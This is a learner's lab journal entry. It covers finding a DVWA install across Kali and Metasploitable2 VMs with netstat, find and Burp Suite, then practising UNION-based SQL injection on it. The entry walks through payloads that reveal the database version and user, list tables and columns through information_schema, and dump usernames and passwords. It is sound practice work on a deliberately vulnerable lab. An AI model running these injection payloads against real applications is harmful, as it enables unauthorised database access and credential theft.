# 🛠️ Day #6 – The Hunt for the Real Host

#### (Screenshots for the day can be seen [here](../Screenshots/Day6.md). Judge away, oh mighty Judgers! )

## 🧱 Block 1: Environment Triage

### 🎯 Block 1 Goal

Run targeted recon across each VM I have to determine where DVWA is actually installed and what service is exposing it.

#### Subtasks for Block 1

- [x] 🔎 Check running services on Kali, Metasploitable2, and host machine
  - use `netstat`, `ss`, or `ps aux | grep apache` to find active web services
  - validate which systems have listeners on port `80` or `8080`
- [x] 📂 File system sweep
  - look for `/var/www/html/dvwa` or `/config/config.inc.php`
  - use `find / -name "dvwa"` if needed (I've been told to prepare to scroll on this one)
- [x] Hit each candidate IP in the browser
  - Test `localhost` and each VM's IP address
  - Confirm which one responds with DVWA's login page
- [x] Verify Apache or other web server logs
  - try `sudo tail -f /var/log/apache2/access.log`
  - interact with DVWA and observe which machine responds

### 💻 Commands Used

```bash
sudo netstat -tulnp | grep :80
sudo netstat -tulnp | grep :8080
ps aux | grep apache
find / -name "config.inc.php" 2>/dev/null
brave-browser --proxy-server="127.0.0.1:8080"
```

### 📥 Outputs to look for

- IP + port pairing that *definitely* points to the DVWA host
- Apache or alternative HTTP service actively responding
- Location of `config.inc.php` or DVWA root directory
- Access logs showing actual requests hitting the system

### 🧠 Observations
#### 🔧 What I was doing

After fighting with DVWA's security level last week, I started fresh with full environmental checks:

- Made sure Metasploitable was running and pingable from Kali
- Verified DVWA was reachable from the browser
- Used `brave-browser --proxy-server="127.0.0.1:8080"` to route traffic through Burp Suite (I'll set up automations later, right now I'm trying to get some muscle memory)
- Ensured DVWA's security level STAYED on `low`

Once the setup was solid, I moved on to testing the input field under the SQL Injection module.

#### 😎 What went right

I slowly ramped up my tests:

- Entered `1` then `2` in the input field. Both returned the employee data I expected meaning I could dig deeper and try to figure out how many columns were in their SQL tables.
- I tried `ORDER BY` statements -- got errors back meaning "Error-based SQLi" is on the table!
- Finally, I tried: 
  
```sql 
 UNION SELECT null, null-- -
 UNION SELECT version(), user()-- -
```

- Which returned:

```sql
First name: 5.0.51a-3ubuntu5
Surname: root@localhost
```

I paused for a happy dance because getting the `root@localhost` means I successfully bypassed input controls, pulled live data from the backend database, AND learned the DB version and user context!

#### 🧠 Some new things I learned

- What does `UNION SELECT` actually mean?
  
  I am new to SQL tables and the jargon has really thrown me for a loop. Now I know the `UNION` keyword in SQL lets you combine results from two `SELECT` statements as long as they have the same number of columns and compatible data types in each column

  So, instead of:

  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = '1'
  ```

  I injected this:

  ```sql
  ' UNION SELECT version(), user()-- - 
  ```

  This merged two `SELECT`s, the original one, and my custom one asking for the DB version and current user. GIVE ME ALL THE SECRETS!

- Why did this work?
  
  I confirmed the number of output columns using `ORDER BY` until I hit an error at `3`. I knew the page displayed `First Name` and `Surname` from my initial input field tests of `1` and `2`, and I knew `version()` and `user()` are built-in MySQL functions that return...exactly what they sound like (Yay!). By sending them in a `UNION SELECT`, I got the app to render that data directly to the page.

---

## 🧱 Block 2: Database Discovery & Table Mapping

### 🎯 Block 2 Goal

Use SQL injection to enumerate DVWA's database structure -- starting with **table names**, then **column names**, and finally, **data extraction**.

#### Subtasks for Block 2

- [x] Confirm database name so I know I'm hitting the right target and SQLi is functional
  - use `' UNION SELECT database(), null-- -`
- [x] List all of the tables in the database
  - use `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -`
    - This pulls the names of all tables within the current database context
    - Screenshots: `users`, `logins`, `credentials`
- [x] Find columns in a target table
  - use `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'-- -`
- [x] Dump interesting data from a table
  - try `' UNION SELECT user, password FROM users-- -`
